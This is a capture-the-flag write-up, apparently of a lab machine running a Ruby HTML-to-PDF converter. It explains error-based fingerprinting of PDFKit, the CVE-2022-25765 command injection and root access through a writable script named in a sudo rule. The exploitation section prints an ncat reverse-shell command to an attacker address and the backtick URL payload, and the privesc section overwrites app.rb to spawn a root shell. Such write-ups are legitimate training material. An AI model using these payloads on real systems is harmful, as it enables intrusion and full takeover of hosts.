
## Summary

Foothold is a command injection in the `PDFKit` Ruby gem (CVE-2022-25765), fingerprinted by deliberately breaking the app's URL input to leak a verbose error message identifying the backend library. Privesc is a sudo rule allowing a specific Ruby script to run as root — since the script itself is fully writable, replacing its contents is enough to get a root shell.

**Chain:** URL-to-PDF converter → error-based fingerprinting of PDFKit → CVE-2022-25765 command injection PoC → shell as andrew → sudo NOPASSWD on a writable ruby script → overwrite script → root

---

## Enumeration

### Nmap

Full port scan:

- `22/tcp` — OpenSSH 8.9p1 Ubuntu
- `3000/tcp` — WEBrick httpd (Ruby's built-in dev web server), page titled "RubyDome HTML to PDF"

**Pattern to remember:** seeing WEBrick specifically is a strong signal you're looking at a Ruby application, often a small custom-built or example app rather than a hardened production framework — worth keeping an eye out for exactly this kind of "convert X to Y" utility app, since they frequently shell out to external converter binaries/libraries under the hood.

### The web app: HTML-to-PDF converter

The app takes a URL, fetches it, and renders it to a PDF for download — submitting `https://www.google.com` redirects to `/pdf` and returns a PDF of Google's homepage.

### Error-based fingerprinting

The app has client-side URL validation on the form, but that's not enforced server-side. Intercepted the request in Burp Suite and tampered with the `url` parameter directly, sending an invalid value (`ssdnf`) that isn't a real URL.

This triggered a `500` error revealing the underlying stack:

```
PDFKit::ImproperWkhtmltopdfExitStatus at /pdf
```

This identifies the backend as the **PDFKit** Ruby gem (a wrapper around the `wkhtmltopdf` binary).

**Pattern to remember:** client-side validation is never a real control — always intercept and tamper with the actual request in Burp/similar, bypassing whatever the form tries to enforce in JS. Also, deliberately breaking an app's input to force a verbose error is one of the most reliable fingerprinting techniques available — stack traces and exception class names routinely name the exact library/version in use, turning "some PDF converter" into "PDFKit gem" in one request.

---

## Exploitation

### CVE-2022-25765 — PDFKit command injection

Searching Exploit-DB for "pdfkit" surfaces a public PoC: [CVE-2022-25765 exploit](https://www.exploit-db.com/exploits/51293) — a command injection vulnerability in how PDFKit passes user-supplied URLs through to the underlying `wkhtmltopdf` shell invocation. Because the URL isn't properly sanitized before being used in a shell context, backtick/command-substitution syntax embedded in the URL gets executed.

```bash
python3 exploit.py -w 'http://<target>:3000/pdf' -p url -c 'ncat -e /bin/bash <attacker_ip> 1234'
```

- `-w` — the vulnerable endpoint
- `-p url` — the POST parameter to inject into (matches what fingerprinting confirmed)
- `-c` — the command to inject, here a `ncat` reverse shell using `-e` to bind a shell to the connection

The exploit constructs a payload roughly equivalent to:

```
http://%20`ncat -e /bin/bash <attacker_ip> 1234`
```

— a URL that PDFKit passes into a shell command, where the backticks trigger command substitution and execute the embedded `ncat` call as a side effect of trying to "process" the malformed URL.

```bash
nc -lvnp 1234
```

Shell received as `andrew`.

**Pattern to remember:** any app that shells out to an external converter/renderer binary (PDF generation, image processing, video transcoding, document conversion) with user-controlled input is a strong candidate for command injection if that input isn't strictly sanitized before hitting the shell. This is a recurring vulnerability class across many different "convert X" library wrappers, not just PDFKit specifically.

---

## Privilege Escalation

### Enumerate sudo rights

```bash
sudo -l
```

```
User andrew may run the following commands on rubydome:
    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
```

`andrew` can run a specific Ruby script as root, no password required — and critically, the script lives in `andrew`'s own home directory, meaning `andrew` almost certainly owns and can write to it.

### Overwriting the script

Rather than trying to inject into the app's existing logic, simply replaced the entire file contents, since sudo only cares that the _path_ matches — not the file's actual content:

```bash
echo 'exec "/bin/bash"' > app.rb
sudo /usr/bin/ruby /home/andrew/app/app.rb
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained.

**Pattern to remember:** a sudo rule that whitelists a script by path (rather than a fixed system binary) is only as strong as the file permissions on that path. If the permitted user can write to the very script they're allowed to run as root, the sudo restriction is meaningless — always check write permissions on any script named in `sudo -l`, not just system binaries. This is functionally the same underlying weakness as a writable cron script (see the Law box), just triggered via sudo instead of a scheduler.

---

## Lessons / Transferable Techniques

1. **Client-side validation is not a control.** Always intercept with Burp and tamper with parameters directly to see what the server actually accepts.
2. **Deliberately break inputs to force verbose errors.** Stack traces and exception messages are a fast, reliable way to fingerprint backend libraries and versions.
3. **Apps that shell out to converter binaries with user-controlled input are a recurring command-injection class** — worth specifically probing any "convert/render/generate X" feature.
4. **When `sudo -l` shows a script rather than a system binary, always check whether you can write to that script.** If you can, the sudo restriction provides no real protection — same underlying weakness as a writable cron job, just a different trigger mechanism.
